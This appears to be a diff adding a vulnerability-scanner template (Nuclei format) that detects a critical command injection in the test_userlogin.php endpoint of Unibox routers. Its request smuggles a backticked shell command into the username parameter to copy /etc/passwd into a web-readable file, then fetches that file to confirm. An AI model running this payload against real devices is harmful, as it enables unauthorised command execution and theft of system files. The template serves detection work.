@@ -1,0 +1,39 @@
+id: unibox-router-test-userlogin-command-injection
+info:
+  name: Unibox Router Command Injection in test_userlogin.php
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: command-injection
+  description: |
+    Unibox routers are vulnerable to a command injection vulnerability in the test_userlogin.php endpoint. This allows attackers to execute arbitrary commands on the device.
+
+variables:
+  t1: "{{rand_base(5)}}"
+
+http:
+  - id: test-command-injection
+    method: GET
+    path:
+      - "/authentication/test_userlogin.php?testuser=1&username=`cat%20/etc/passwd>{{t1}}.txt`%20%23%20"
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Test User Login"
+
+  - id: verify-command-injection
+    method: GET
+    path:
+      - "/authentication/{{t1}}.txt"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
